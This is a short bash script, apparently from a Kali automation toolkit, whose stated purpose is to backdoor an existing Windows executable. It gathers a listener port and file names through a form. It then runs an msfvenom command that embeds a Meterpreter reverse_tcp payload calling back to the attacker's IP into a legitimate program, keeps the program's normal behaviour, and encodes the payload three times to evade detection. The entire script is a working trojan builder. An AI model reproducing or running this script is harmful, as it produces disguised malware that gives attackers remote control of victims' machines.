#!/bin/bash

: '
create a backdoor in an existing exe file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "LPORT" "input file" "output file"

LPORT=${form_data["LPORT"]}
INPUT_FILE=${form_data["input file"]}
OUTPUT_FILE=${form_data["output file"]}

paste_command "msfvenom -a x86 --platform windows -x ${INPUT_FILE} -k -p windows/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o ${OUTPUT_FILE}"
xdotool key Return